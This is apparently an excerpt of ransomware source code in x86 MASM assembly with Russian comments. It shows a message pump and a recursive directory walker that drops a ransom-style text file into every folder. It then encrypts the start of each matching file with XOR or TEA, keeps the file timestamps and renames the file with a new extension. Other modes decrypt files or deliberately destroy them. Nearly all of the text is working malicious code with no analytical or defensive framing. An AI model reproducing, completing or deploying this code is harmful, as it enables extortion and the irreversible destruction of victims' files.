ProcessAllMessages proc
      LOCAL msg :MSG
      
    msg_lp:
      invoke  PeekMessage, addr msg, 0, 0, 0, PM_REMOVE
      test    eax, eax
      je      no_msg
      invoke  TranslateMessage, addr msg
      invoke  DispatchMessage, addr msg
      jmp     msg_lp
    no_msg:
      ret
ProcessAllMessages endp

; Рекурсивный поиск спижжен из интронетов
CryptFiles proc
      push    ebp                                  
      mov     ebp, esp                              
      sub     esp, 144h                             
      lea     eax, [ebp-144h]                       
      invoke  FindFirstFile, addr buf, eax         
      inc     eax                                  
      je      exit_now
      dec     eax                                  
      mov     dword ptr [ebp-6h], eax               
find_next:

      mov     eax, dword ptr [ebp-144h]             
      and     eax, FILE_ATTRIBUTE_DIRECTORY         
      je      found  
                                    
      lea     eax, [ebp-118h]                       
      invoke  lstrcmp, addr fake1, eax
      test    eax, eax                              
      je      next 
                                     
      lea     eax, [ebp-118h]                       
      invoke  lstrcmp, addr fake2, eax
      test    eax, eax                              
      je      next
      
      push    offset buf
      call    PathFindFileName
      sub     eax, offset buf
      push    eax
      mov     byte ptr [buf+eax], 0
      
      lea     eax,[ebp-118h]
      invoke  lstrcat, offset buf,eax
      invoke  lstrlen, offset buf
      mov     dword ptr [buf+eax],'*.*\'
      mov     byte ptr [buf+eax+4],0
      call    CryptFiles
      pop     eax
      mov     dword ptr [buf+eax-1],'*.*\'
      mov     byte ptr [buf+eax+3],0
      jmp     next
      
found:
      call    ProcessAllMessages
      
      lea     eax, [ebp-118h]
      invoke  lstrcmpi, addr ReadMe, eax
      test    eax, eax
      je      next
      
      lea     eax, [ebp-118h]
      invoke  lstrcmpi, addr ReadMe2, eax
      test    eax, eax
      je      next
      
      lea     eax,[ebp-118h]
      invoke  lstrcmpi, addr imgname, eax
      test    eax, eax
      je      next
      
      push    offset buf
      call    PathFindFileName
      sub     eax, offset buf
      mov     byte ptr [buf+eax],0
      
      ; Дропнем в папочку текстовик
      mov     al, byte ptr [DropTxtToAllFldrs]
      .if     al == XR_ENABLED
              invoke  DropTXT, addr buf
      .endif
      
      lea     ebx, [ebp-118h]
      invoke  lstrcat, addr buf, ebx
      
      .if     WORKING_STATUS == 1
              ; Расшифровываем файлы
              push    offset TempBuf2
              push    offset buf
              call    PathMatchSpec
              cmp     eax, 1
              je      fileisgood
              jmp     next
      .else
              ; Шифруем(0)/Убиваем(2) файлы
              mov     edi, dword ptr [hMasks]
              mov     ecx, dword ptr [edi]
              add     edi, 4
words_names_loop:
              push    ecx
              push    edi
              push    offset buf
              call    PathMatchSpec
              mov     ebx, eax
              invoke  lstrlen, edi
              add     edi, eax
              inc     edi
              pop     ecx
              cmp     ebx, 1
              je      fileisgood
              dec     ecx
              jne     words_names_loop
              jmp     next
      .endif

fileisgood:
      
      invoke  lstrcpy, addr cpyfrom, addr buf
      .if     WORKING_STATUS == 0
              ; Шифруем файлы - добавим расширение
              invoke  lstrcpy, addr CrptFN, addr buf
              invoke  lstrcat, addr CrptFN, addr fake1
              invoke  lstrcat, addr CrptFN, hExt
      .elseif WORKING_STATUS == 1
              ; Расшифровываем файлы - уберем расширение
              invoke  lstrcpy, addr CrptFN, addr buf
              invoke  PathFindExtension, addr CrptFN
              mov     byte ptr [eax], 0
      .else
              ; Убиваем файлы - имя файла не трогаем, пусть остается с нашим расширением
              invoke  lstrcpy, addr CrptFN, addr buf
      .endif
      
; Crypt starts here
      invoke  CreateFile, addr cpyfrom, GENERIC_READ or GENERIC_WRITE, 
                          FILE_SHARE_READ or FILE_SHARE_WRITE, 
                          0, OPEN_EXISTING, 0, 0
      inc     eax
      test    eax, eax
      je      BusyFile
      dec     eax
                         
      mov     hFile, eax
      
      invoke  GetFileSize, hFile, 0
      mov     fSize, eax
      
      cmp     eax, 8
      jge     good_file
      invoke  CloseHandle, hFile
      jmp     BusyFile
      
good_file:
      
      invoke  GetFileTime, hFile, addr dt_ct, addr dt_lat, addr dt_lwt
      
      invoke  SetFilePointer, hFile, START_OFFSET, NULL, FILE_BEGIN
      invoke  ReadFile, hFile, hMem, BUF_SIZE, addr nr, NULL
      .if     nr == 0
              jmp     EndOfFile
      .endif

; Randomize TEA_KEY with xoring first letter of the filename      
      invoke  PathFindFileName, addr cpyfrom
      mov     dl, byte ptr [eax]
      mov     ecx, 16
      mov     esi, offset TEA_KEY_origin ; from
      mov     edi, offset TEA_KEY        ; to
tk_rnd:
      lodsb
      xor     al, dl
      rol     dl, 1
      stosb
      loop    tk_rnd
      
; Crypt buffer
      mov     eax, nr
      .if     UsingXorOrTea == 0
              call    XORBuf
      .else
              .if     WORKING_STATUS == 0
                      call    TEABuf
              .else
                      call    TEABufDec
              .endif
      .endif
      
      invoke  SetFilePointer, hFile, START_OFFSET, NULL, FILE_BEGIN
      invoke  WriteFile, hFile, hMem, nr, addr bw, NULL
      
EndOfFile:
      
      invoke  SetFileTime, hFile, addr dt_ct, addr dt_lat, addr dt_lwt
      
      invoke  CloseHandle, hFile
      invoke  MoveFile, addr cpyfrom, addr CrptFN
; Crypt ends here
      
BusyFile:
next:
      lea     eax,[ebp-144h]                          
      invoke  FindNextFile,dword ptr [ebp-6h],eax     
      test    eax,eax                                 
      jne     find_next                               

      invoke  FindClose, dword ptr [ebp-6h]           
exit_now:
      leave                                           
      ret                                             
CryptFiles endp

;^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/

XORBuf   proc
      mov     ecx, eax
      shr     ecx, 2
      test    ecx, ecx
      je      ToSmallForXor
      cmp     eax, dword ptr [BUF_SIZE]
      je      over_increation
      inc     ecx
over_increation:
      mov     esi, hMem
      mov     edi, esi
      xor     edx, edx
crpt:
      cmp     edx, sizeof KEY
      jne     zeroing
      xor     edx, edx
zeroing:
      lodsd
      xor     eax, dword ptr [KEY+edx]
      stosd
      add     edx, 4
      dec     ecx
      jnz     crpt
ToSmallForXor:
      ret
XORBuf   endp

;^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/

TEABuf   proc
      mov     ebx, eax
      shr     ebx, 3
      test    ebx, ebx
      je      TooSmall
      mov     esi, hMem
crpt:
      invoke  TEAEncrypt, esi, esi
      add     esi, 8
      dec     ebx
      jnz     crpt
TooSmall:
      ret
TEABuf   endp

TEABufDec   proc
      mov     ebx, eax
      shr     ebx, 3
      test    ebx, ebx
      je      TooSmallTeaDec
      mov     esi, hMem
crpt:
      invoke  TEADecrypt, esi, esi
      add     esi, 8
      dec     ebx
      jnz     crpt
TooSmallTeaDec:
      ret
TEABufDec   endp

;^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/^/